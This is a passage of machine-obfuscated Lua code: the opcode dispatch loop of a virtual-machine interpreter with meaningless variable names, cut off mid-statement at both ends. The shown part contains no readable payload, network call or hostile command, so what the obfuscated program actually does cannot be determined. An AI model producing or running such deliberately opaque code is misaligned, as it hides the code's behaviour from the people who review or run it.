w[y[266]]=h[y[607]];else if ba<144 then n=n+1;else y=f[n];end end end else if ba<=146 then if ba~=146 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba<=147 then y=f[n];else if 148<ba then n=n+1;else w[y[266]][w[y[607]]]=w[y[185]];end end end end else if ba<=154 then if ba<=151 then if ba<151 then y=f[n];else w[y[266]]=j[y[607]];end else if ba<=152 then n=n+1;else if ba==153 then y=f[n];else w[y[266]]=w[y[607]];end end end else if ba<=156 then if 156~=ba then n=n+1;else y=f[n];end else if ba<=157 then bb=y[266]else if ba==158 then w[bb]=w[bb](w[bb+1])else break end end end end end end end end ba=ba+1 end elseif 77>z then w[y[266]]=w[y[607]]-w[y[185]];else local ba=y[266]w[ba]=w[ba]()end;elseif z<=78 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266];w[ba]=w[ba]-w[ba+2];n=y[607];elseif 80>z then local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))else local ba=y[607];local bb=y[185];local ba=k(w,g,ba,bb);w[y[266]]=ba;end;elseif z<=86 then if z<=83 then if z<=81 then w[y[266]]=w[y[607]]%y[185];elseif z<83 then w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];if(w[y[266]]~=y[185])then n=n+1;else n=y[607];end;else w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];n=y[607];end;elseif 84>=z then local ba;w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=y[185];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))elseif 86~=z then local ba;w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba]()else w[y[266]]=false;n=n+1;end;elseif 89>=z then if 87>=z then local ba=y[266];local bb=w[y[607]];w[ba+1]=bb;w[ba]=bb[y[185]];elseif z~=89 then w[y[266]]=w[y[607]][y[185]];else local ba;local bb;local bc;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];bc=y[266]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[185]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=90 then local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]]*y[185];n=n+1;y=f[n];w[y[266]]=w[y[607]]+w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]]+w[y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))elseif z~=92 then local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))else w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];if(w[y[266]]~=y[185])then n=n+1;else n=y[607];end;end;elseif z<=139 then if 115>=z then if z<=103 then if z<=97 then if 94>=z then if z==93 then local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))else local ba;local bb;local bc;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];bc=y[266]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[185]do ba=ba+1;w[bd]=bb[ba];end end;elseif 95>=z then local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))elseif 97>z then local ba=y[266]local bb={w[ba](r(w,ba+1,y[607]))};local bc=0;for bd=ba,y[185]do bc=bc+1;w[bd]=bb[bc];end;else local ba;w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))end;elseif 100>=z then if 98>=z then local ba;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))elseif z<100 then local ba;local bb;w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]={r({},1,y[607])};n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];bb=y[266];ba=w[bb];for bc=bb+1,y[607]do t(ba,w[bc])end;else local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))end;elseif z<=101 then w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if(w[y[266]]~=w[y[185]])then n=n+1;else n=y[607];end;elseif 102==z then w[y[266]]=w[y[607]]-y[185];else local ba;w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))end;elseif z<=109 then if z<=106 then if(z<=104)then local ba,bb=0 while true do if ba<=22 then if ba<=10 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else w[y[266]]=w[y[607]][y[185]];end else if ba<=2 then n=n+1;else if 4>ba then y=f[n];else w[y[266]]=h[y[607]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba<7 then y=f[n];else w[y[266]]=h[y[607]];end end else if ba<=8 then n=n+1;else if 9==ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then n=n+1;else if ba==12 then y=f[n];else w[y[266]]=w[y[607]][w[y[185]]];end end else if ba<=14 then n=n+1;else if 16~=ba then y=f[n];else w[y[266]]={};end end end else if ba<=19 then if ba<=17 then n=n+1;else if ba==18 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if ba<=20 then n=n+1;else if ba==21 then y=f[n];else w[y[266]][y[607]]=w[y[185]];end end end end end else if ba<=33 then if ba<=27 then if ba<=24 then if ba>23 then y=f[n];else n=n+1;end else if ba<=25 then w[y[266]]=h[y[607]];else if ba>26 then y=f[n];else n=n+1;end end end else if ba<=30 then if ba<=28 then w[y[266]]=w[y[607]][y[185]];else if 30~=ba then n=n+1;else y=f[n];end end else if ba<=31 then w[y[266]][y[607]]=w[y[185]];else if ba<33 then n=n+1;else y=f[n];end end end end else if ba<=39 then if ba<=36 then if ba<=34 then w[y[266]]=h[y[607]];else if ba<36 then n=n+1;else y=f[n];end end else if ba<=37 then w[y[266]]=w[y[607]][y[185]];else if ba<39 then n=n+1;else y=f[n];end end end else if ba<=42 then if ba<=40 then w[y[266]][y[607]]=w[y[185]];else if ba>41 then y=f[n];else n=n+1;end end else if ba<=43 then bb=y[266]else if 44==ba then w[bb](r(w,bb+1,y[607]))else break end end end end end end ba=ba+1 end elseif(106~=z)then if(not(w[y[266]]==y[185]))then n=n+1;else n=y[607];end;else w[y[266]]=(w[y[607]]*y[185]);end;elseif 107>=z then w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];n=y[607];elseif z<109 then local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))else local ba;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))end;elseif z<=112 then if(110>z or 110==z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if(ba==4 or ba<4)then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if(ba==2 or ba<2)then bd=nil else if ba>3 then n=n+1;else w[y[266]]=h[y[607]];end end end else if(ba<=6)then if(ba<6)then y=f[n];else w[y[266]]=h[y[607]];end else if(ba==7 or ba<7)then n=(n+1);else if not(9==ba)then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if(ba==14 or ba<14)then if(ba==11 or ba<11)then if ba<11 then n=(n+1);else y=f[n];end else if ba<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if(14>ba)then n=(n+1);else y=f[n];end end end else if(ba<16 or ba==16)then if(ba<16)then bd=y[266]else bc={w[bd](w[bd+1])};end else if(ba<17 or ba==17)then bb=0;else if 18<ba then break else for be=bd,y[185]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=(ba+1)end elseif(112~=z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[266]]=h[y[607]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 7>ba then y=f[n];else w[y[266]]=y[607];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if 11>ba then w[y[266]]=y[607];else n=n+1;end end else if ba<=13 then if ba>12 then bb=y[266]else y=f[n];end else if ba<15 then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end ba=ba+1 end else local ba=y[266]local bb,bc=i(w[ba](r(w,ba+1,y[607])))p=(bc+ba-1)local bc=0;for bd=ba,p do bc=(bc+1);w[bd]=bb[bc];end;end;elseif z<=113 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[266]]=h[y[607]];end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if ba~=16 then bd=y[266]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[185]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 115~=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];if(w[y[266]]~=y[185])then n=n+1;else n=y[607];end;else w[y[266]]();end;elseif z<=127 then if 121>=z then if z<=118 then if 116>=z then local ba;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](w[ba+1])elseif 117==z then w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if w[y[266]]then n=n+1;else n=y[607];end;else local ba;local bb;local bc;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];bc=y[266]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[185]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=119 then local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=false;n=n+1;y=f[n];ba=y[266]w[ba](w[ba+1])elseif 120<z then local ba=y[266]w[ba]=w[ba](r(w,ba+1,p))else local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba]()end;elseif z<=124 then if(z<122 or z==122)then local ba=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then n=n+1;else a(c,e);end else if 3>ba then y=f[n];else w={};end end else if ba<=5 then if ba~=5 then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end else if ba<=6 then y=f[n];else if ba~=8 then w[y[266]]=y[607];else n=n+1;end end end end else if ba<=12 then if ba<=10 then if ba>9 then w[y[266]]=j[y[607]];else y=f[n];end else if ba~=12 then n=n+1;else y=f[n];end end else if ba<=14 then if ba>13 then n=n+1;else w[y[266]]=j[y[607]];end else if ba<=15 then y=f[n];else if ba>16 then break else w[y[266]]=w[y[607]][y[185]];end end end end end ba=ba+1 end elseif not(z==124)then w[y[266]]=j[y[607]];else local ba=y[266];p=(ba+x-1);for bb=ba,p do local ba=q[(bb-ba)];w[bb]=ba;end;end;elseif z<=125 then a(c,e);elseif z==126 then local ba=y[266]w[ba](r(w,ba+1,y[607]))else w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if(w[y[266]]~=w[y[185]])then n=n+1;else n=y[607];end;end;elseif 133>=z then if 130>=z then if 128>=z then local ba;local bb;local bc;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];bc=y[607];bb=y[185];ba=k(w,g,bc,bb);w[y[266]]=ba;elseif z==129 then j[y[607]]=w[y[266]];else local ba=y[266];do return r(w,ba,p)end;end;elseif 131>=z then w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];for ba=y[266],y[607],1 do w[ba]=nil;end;n=n+1;y=f[n];w[y[266]]=j[y[607]];elseif z~=133 then w[y[266]][y[607]]=w[y[185]];else local ba;w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))end;elseif z<=136 then if 134>=z then w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if w[y[266]]then n=n+1;else n=y[607];end;elseif z==135 then w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if w[y[266]]then n=n+1;else n=y[607];end;else w[y[266]]=w[y[607]]+y[185];end;elseif 137>=z then local ba;local bb;local bc;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];bc=y[266]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[185]do ba=ba+1;w[bd]=bb[ba];end elseif 139~=z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];ba=y[266]w[ba](w[ba+1])else w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];n=y[607];end;elseif z<=162 then if 150>=z then if 144>=z then if z<=141 then if z<141 then local ba;local bb;local bc;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];bc=y[266]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[185]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))end;elseif 142>=z then local ba;local bb;local bc;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];bc=y[266]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[185]do ba=ba+1;w[bd]=bb[ba];end elseif z>143 then local ba=y[266]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end else local ba=d[y[607]];local bb={};local bc={};for bd=1,y[185]do n=n+1;local be=f[n];if be[77]==32 then bc[bd-1]={w,be[607]};else bc[bd-1]={h,be[607]};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(bd,bd)local bd=bc[bd];return bd[1][bd[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bd,bd,be)local bc=bc[bd]bc[1][bc[2]]=be;end;});w[y[266]]=b(ba,bb,j);end;elseif 147>=z then if 145>=z then local ba;local bb;local bc;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];bc=y[266]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[185]do ba=ba+1;w[bd]=bb[ba];end elseif z~=147 then local ba=y[266];w[ba]=w[ba]-w[ba+2];n=y[607];else w[y[266]]=j[y[607]];end;elseif 148>=z then local ba=y[266];local bb,bc,bd=w[ba],w[ba+1],w[ba+2];local bb=bb+bd;w[ba]=bb;if bd>0 and bb<=bc or bd<0 and bb>=bc then n=y[607];w[ba+3]=bb;end;elseif z<150 then w[y[266]]=w[y[607]][y[185]];else w[y[266]]=w[y[607]]+w[y[185]];end;elseif 156>=z then if z<=153 then if z<=151 then local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba~=2 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end else if ba<=4 then if ba<4 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if ba>5 then y=f[n];else n=n+1;end end end else if ba<=10 then if ba<=8 then if 7<ba then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if 10~=ba then y=f[n];else w[y[266]]=w[y[607]]*y[185];end end else if ba<=12 then if ba>11 then y=f[n];else n=n+1;end else if 13<ba then n=n+1;else w[y[266]]=w[y[607]]+w[y[185]];end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if ba>15 then w[y[266]]=j[y[607]];else y=f[n];end else if 18>ba then n=n+1;else y=f[n];end end else if ba<=20 then if ba~=20 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 21<ba then w[y[266]]=w[y[607]];else y=f[n];end end end else if ba<=26 then if ba<=24 then if 24>ba then n=n+1;else y=f[n];end else if 26>ba then w[y[266]]=w[y[607]]+w[y[185]];else n=n+1;end end else if ba<=28 then if 27<ba then bb=y[266]else y=f[n];end else if 30~=ba then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end end ba=ba+1 end elseif 152<z then local ba;local bb;local bc;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];bc=y[266]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[185]do ba=ba+1;w[bd]=bb[ba];end else local ba=y[266];local bb=y[185];local bc=ba+2;local bd={w[ba](w[ba+1],w[bc])};for be=1,bb do w[bc+be]=bd[be];end local ba=w[ba+3];if ba then w[bc]=ba;n=y[607];else n=n+1 end;end;elseif z<=154 then local ba;w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba]()elseif z~=156 then local ba=y[266];do return w[ba](r(w,ba+1,y[607]))end;else local ba=y[266]local bb={w[ba](r(w,ba+1,y[607]))};local bc=0;for bd=ba,y[185]do bc=bc+1;w[bd]=bb[bc];end;end;elseif 159>=z then if 157>=z then if(w[y[266]]~=y[185])then n=(n+1);else n=y[607];end;elseif 158<z then local ba=y[266];p=ba+x-1;for x=ba,p do local q=q[x-ba];w[x]=q;end;else local q=y[266]w[q](r(w,q+1,y[607]))end;elseif z<=160 then if(w[y[266]]<w[y[185]]or w[y[266]]==w[y[185]])then n=n+1;else n=y[607];end;elseif z~=162 then local q=y[266];do return w[q](r(w,q+1,y[607]))end;else local q=w[y[185]];if not q then n=n+1;else w[y[266]]=q;n=y[607];end;end;elseif 174>=z then if 168>=z then if 165>=z then if 163>=z then local q=0 while true do if q<=18 then if q<=8 then if q<=3 then if q<=1 then if 0==q then w[y[266]]=j[y[607]];else n=n+1;end else if 3~=q then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if q<=5 then if 5~=q then n=n+1;else y=f[n];end else if q<=6 then w[y[266]]=j[y[607]];else if 8~=q then n=n+1;else y=f[n];end end end end else if q<=13 then if q<=10 then if q<10 then w[y[266]]=j[y[607]];else n=n+1;end else if q<=11 then y=f[n];else if 13>q then w[y[266]]=j[y[607]];else n=n+1;end end end else if q<=15 then if 14<q then w[y[266]]=j[y[607]];else y=f[n];end else if q<=16 then n=n+1;else if 17==q then y=f[n];else w[y[266]]=j[y[607]];end end end end end else if q<=27 then if q<=22 then if q<=20 then if q~=20 then n=n+1;else y=f[n];end else if 22~=q then w[y[266]]=j[y[607]];else n=n+1;end end else if q<=24 then if 23==q then y=f[n];else w[y[266]]=j[y[607]];end else if q<=25 then n=n+1;else if q~=27 then y=f[n];else w[y[266]]=j[y[607]];end end end end else if q<=32 then if q<=29 then if 28==q then n=n+1;else y=f[n];end else if q<=30 then w[y[266]]={};else if q~=32 then n=n+1;else y=f[n];end end end else if q<=34 then if q>33 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if q<=35 then y=f[n];else if 37>q then if not w[y[266]]then n=n+1;else n=y[607];end;else break end end end end end end q=q+1 end elseif z>164 then local 